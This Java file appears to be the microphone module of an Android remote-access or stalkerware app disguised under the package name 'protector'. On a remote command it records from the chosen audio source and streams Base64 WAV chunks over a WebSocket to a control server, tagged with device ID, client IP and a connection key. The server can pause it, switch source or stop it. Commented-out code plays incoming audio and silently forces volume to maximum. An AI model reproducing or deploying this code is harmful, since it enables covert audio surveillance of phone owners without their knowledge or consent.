package com.icontrol.protector;

import static com.icontrol.protector.Consts.URL_SOCKT;

import android.content.Context;

import android.content.pm.PackageManager;

import android.media.AudioFormat;

import android.media.AudioRecord;

import android.media.MediaRecorder;
import android.media.audiofx.AcousticEchoCanceler;
import android.os.Build;
import android.util.Base64;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;


import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;


public class Microphone {
    private static OkHttpClient client;
    private static boolean isActive = false;
    private static boolean isPause = false;
    private static int newSo;
    private static int newRate;
    public static WebSocket ws;

    static int ch = AudioFormat.CHANNEL_CONFIGURATION_MONO;
    static int aud = AudioFormat.ENCODING_PCM_16BIT;

    public static void Start(final String audiorate,
                             final String source,
                             final String sokidf,
                             Context ctx){

        new Thread(new Runnable() {
            @Override
            public void run() {

                client = new OkHttpClient();
                Request request = new Request.Builder().url(URL_SOCKT()).build();
                ws = client.newWebSocket(request, new WebSocketListener() {


                    @Override
                    public void onClosing(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
                        super.onClosing(webSocket, code, reason);
                        killall();
                    }

                    @Override
                    public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, @Nullable Response response) {
                        super.onFailure(webSocket, t, response);
                        killall();
                    }

                    @Override
                    public void onOpen(WebSocket webSocket, Response response) {

                        Thread thread = new Thread() {
                            @Override
                            public void run() {
                                try {
                                    isActive=true;

                                    Object Syn_x1 = new Object();


                                    AudioRecord rec = null;

                                    try {


                                        ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                        try {
                                            int so = Integer.valueOf(source);
                                            int rate = Integer.valueOf(audiorate);
                                            int buff = AudioRecord.getMinBufferSize(rate, ch, aud);
                                            byte[] buffer = new byte[buff];


                                            rec =  initializeRecorder(so, rate,rec,buff);

                                            if(rec == null){
                                                return;
                                            }


                                            newSo = Integer.valueOf(source);
                                            newRate = Integer.valueOf(audiorate);

                                            int holder = 0;
                                            ByteArrayOutputStream accumulatedBOS = new ByteArrayOutputStream();
                                            int chunkSize = 20 * buffer.length; // Example: Accumulate 10000 buffers worth of data
                                            String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                                            while (isActive) {
                                                synchronized (Syn_x1) {

                                                    if (newSo != so || newRate != rate) {
                                                        so = newSo;
                                                        rate = newRate;
                                                        rec = initializeRecorder(so, rate, rec, buff);
                                                    }

                                                    rec.read(buffer, 0, buffer.length);
                                                    BOS.write(buffer, 0, buffer.length);

                                                    try {
                                                        if (!isPause) {
                                                            accumulatedBOS.write(buffer, 0, buffer.length);
                                                            holder += buffer.length;

                                                            if (holder >= chunkSize) {
                                                                byte[] pcmData = accumulatedBOS.toByteArray();
                                                                byte[] wavData = AudioUtils.addWavHeader(pcmData, rate, 1, 16);


                                                                try {



                                                                    String VoiceSTR = Base64.encodeToString(wavData, Base64.DEFAULT);
                                                                    JSONObject jsonObject = new JSONObject();
                                                                    jsonObject.put("type", "mic");
                                                                    jsonObject.put("voc", VoiceSTR);

                                                                    String jsonData = jsonObject.toString();

                                                                    Livemessage(ctx,jsonData, sokidf,conctkey);
                                                                } catch (Exception e) {
                                                                    killall();

                                                                }



                                                                holder = 0;
                                                                accumulatedBOS.reset(); // Reset the accumulated buffer for the next chunk
                                                            }
                                                        }
                                                    } catch (Exception e) {
                                                        e.printStackTrace();
                                                    }

                                                    BOS.reset();
                                                }
                                            }

                                        } catch (Exception e) {
                                            killall();
                                        } catch (OutOfMemoryError e) {
                                            killall();
                                        }

                                        BOS.close();



                                    } catch (Exception e) {
                                    } catch (OutOfMemoryError e) {}


                                    try{
                                        if (rec != null) {
                                            rec.stop();
                                            rec.release();
                                        }
                                    } catch (Exception e) {}

                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                        };
                        thread.start();



                    }
                    AudioRecord initializeRecorder(int so, int rate, AudioRecord rec,int buff) {
                        if (ActivityCompat.checkSelfPermission(ctx, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                            return null;
                        }
                        if (rec != null) {
                            rec.stop();
                            rec.release();
                        }

                        switch (so) {
                            case 1:
                                rec = new AudioRecord(MediaRecorder.AudioSource.MIC, rate, ch, aud, buff);
                                break;
                            case 2:
                                rec = new AudioRecord(MediaRecorder.AudioSource.VOICE_RECOGNITION, rate, ch, aud, buff);
                                break;
                            case 3:
                                rec = new AudioRecord(MediaRecorder.AudioSource.VOICE_COMMUNICATION, rate, ch, aud, buff);
                                break;
                            case 4:
                                rec = new AudioRecord(MediaRecorder.AudioSource.CAMCORDER, rate, ch, aud, buff);
                                break;
                            default:
                                rec = new AudioRecord(MediaRecorder.AudioSource.DEFAULT, rate, ch, aud, buff);
                                break;
                        }

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                            try {
                                AcousticEchoCanceler.create(rec.getAudioSessionId());
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }

                        rec.startRecording();
                        return rec;
                    }
                    @Override
                    public void onMessage( WebSocket webSocket, String text) {
                        super.onMessage(webSocket, text);
                        try{
                            JSONObject Response = new JSONObject(text);
                            String msgtype = Response.optString("type","empty");
                            if(msgtype.equals("stop") || msgtype.equals("Unauthorized access")){
                                killall();
                            }
                        }catch (Exception a){}
                    }
                    private void Livemessage(Context ctx, String msg,String sokidf,String conctkey) {
                        if (ws != null) {

                            try {



                                String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
                                String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
                                String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");

                                if(!sokidf.equals("null")){
                                    IDF = sokidf;
                                }

                                if (Myid == null) {
                                    return;
                                }
                                if (IDF == null) {
                                    return;
                                }



                                JSONObject message = new JSONObject();
                                // message.put("userId", userid);
                                message.put("idf", IDF);
                                message.put("pid", Myid);
                                message.put("itype", "Slr_client");
                                message.put("subc", "msg");
                                message.put("msg", msg);
                                message.put("cip", CIP);

                                message.put("conk", conctkey);
                                // Send the JSON message as a string
                                ws.send(message.toString());
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                    public void killall(){

                        isActive=false;
                        try{
                            if (ws != null) {
                                ws.cancel();
                                ws = null;
                            }
                            if (client != null) {
                                client.dispatcher().cancelAll();
                                client.connectionPool().evictAll();
                                client.dispatcher().executorService().shutdown();
                                client = null;
                            }
                        }catch (Exception s){

                        }


                    }
                });
            }
        }).start();
    }


    public static void Stop(){
        isActive=false;
        try{
            if (ws != null) {
                ws.cancel();
                ws = null;
            }
            if (client != null) {
                client.dispatcher().cancelAll();
                client.connectionPool().evictAll();
                client.dispatcher().executorService().shutdown();
                client = null;
            }
        }catch (Exception s){

        }
    }

    public static void Pause(boolean state){
        isPause=state;
    }

    public static void ChangeRate(int newvalue){
        newRate = newvalue;
    }
    public static void ChangeSrc(int newvalue){
        newSo = newvalue;
    }
//    private void inp(final String h ,final String p,final String HnD,final String key0,final String ca, final String ra ,final Context ctx){
//        new Thread(new Runnable() {  @Override
//        public void run() {
//            Socket sk = null;
//            OutputStream out = null;
//            DataInputStream in = null;
//            boolean ctd = false;
//            Object Syn_x1 = new Object();
//            Object Syn_x2 = new Object();
//            int test = 0;
//            do {
//                if (test >= 3){
//                    return;
//                }
//                try {
//                    InetAddress ip;
//                    ip = InetAddress.getByName(h);
//                    InetSocketAddress sock = new InetSocketAddress(ip, Integer.valueOf(p));
//                    sk = new Socket();
//                    sk.setSoTimeout(0);
//                    sk.setKeepAlive(true);
//                    sk.connect(sock, 60000);
//                    ctd = sk.isConnected();
//                    if (ctd == true) {
//                        sk.setSendBufferSize(1023);
//                        sk.setReceiveBufferSize(1023);
//                        out = sk.getOutputStream();
//                        synchronized (Syn_x1){
//                            if(out != null){
//                                String info = key0 + SPL_ARRAY + HnD + SPL_ARRAY + ra;
//                                byte[] b0 = f(key0,info.getBytes());
//                                sk.setSendBufferSize(b0.length);
//                                out = sk.getOutputStream();
//                                in = new DataInputStream(new BufferedInputStream(sk.getInputStream()));
//                                out.write(b0,0,b0.length);
//                            }
//                        }
//                        break;
//                    }
//                } catch (UnknownHostException e) {
//                    di(sk,out,in);
//                } catch (SocketException e) {
//                    di(sk,out,in);
//                } catch (Exception e) {
//                    di(sk,out,in);
//                }
//                test++;
//                try{ Thread.sleep(1);} catch (InterruptedException e) {}
//            } while (ctd == false);
//            int read;
//            try{
//                int rt = Integer.valueOf(ra);
//                int intSize = AudioTrack.getMinBufferSize(rt,AudioFormat.CHANNEL_OUT_MONO , AudioFormat.ENCODING_PCM_16BIT);
//                byte[] buff = new byte[intSize * 15];
//                AudioTrack at = null;
//                int so = Integer.valueOf(ca);
//                if (so == 0){
//                    at = new AudioTrack(AudioManager.STREAM_VOICE_CALL, rt, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, intSize, AudioTrack.MODE_STREAM);
//                }else if (so == 1){
//                    at = new AudioTrack(AudioManager.STREAM_MUSIC, rt, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, intSize, AudioTrack.MODE_STREAM);
//                }
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
//                    try{
//                        AcousticEchoCanceler.create(at.getAudioSessionId());
//                    } catch (Exception e) {}}
//                at.play();
//                while ((read = in.read(buff)) > 0)
//                {
//                    synchronized(Syn_x2){
//                        if (at!= null) {
//                            if (so == 0){
//                                VOICE_CALL(ctx);
//                            }else  if (so == 1){
//                                MUSIC(ctx);
//                            }
//                            sk.setReceiveBufferSize(buff.length);
//                            at.write(buff, 0, read);
//                        }
//                    }
//                }
//                at.stop();
//                at.release();
//            }catch (SocketException e) {
//            }catch (SocketTimeoutException s) {
//            }catch(OutOfMemoryError e){
//            }catch (Exception e) {}
//            try{ Thread.sleep(1000L);} catch (InterruptedException e) {}
//            di(sk,out,in);
//        }}).start();
//    }

//    private AudioManager aum = null;
//    private void MUSIC(Context ctx){
//        try {
//            if (aum == null ){
//                aum = (AudioManager)ctx.getSystemService(Context.AUDIO_SERVICE);
//            }
//            if (aum != null ){
//                int max = aum.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
//                int val = aum.getStreamVolume(AudioManager.STREAM_MUSIC);
//                if (max != val){
//                    aum.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
//                }
//            }
//        } catch (Exception e) {}
//    }
//    private AudioManager auv = null;
//    private void VOICE_CALL(Context ctx){
//        try {
//            if (auv == null ){
//                auv = (AudioManager)ctx.getSystemService(Context.AUDIO_SERVICE);
//            }
//            if (auv != null ){
//                int max = auv.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
//                int val = auv.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
//                if (max != val){
//                    auv.setStreamVolume(AudioManager.STREAM_VOICE_CALL, max, 0);
//                }
//            }
//        } catch (Exception e) {}
//    }


}
